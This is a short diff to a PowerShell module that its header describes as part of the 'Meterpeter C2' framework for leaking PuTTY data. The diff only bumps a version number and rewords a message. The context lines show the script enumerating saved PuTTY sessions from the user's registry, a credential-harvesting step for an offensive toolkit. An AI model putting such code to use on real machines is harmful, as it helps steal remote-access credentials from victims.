@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (19044) x64 bits
    Required Dependencies: Putty
    Optional Dependencies: none
-   PS cmdlet Dev version: v1.0.1
+   PS cmdlet Dev version: v1.0.2
 
 .DESCRIPTION
    Auxiliary module of Meterpeter C2 v2.10.13 that Leaks PUTTY
@@ -63,7 +63,7 @@ Else
    $SavedSessions = (Get-Item HKCU:\Software\SimonTatham\PuTTY\Sessions\*).Name|ForEach-Object{ $_.split("\")[5]}
    If(-not($SavedSessions))
    {
-      write-host "`n   > None putty sessions found in $Env:COMPUTERNAME`n" -ForegroundColor Red
+      write-host "`n   > None putty sessions credentials found in $Env:COMPUTERNAME`n" -ForegroundColor Red
       return
    }
 
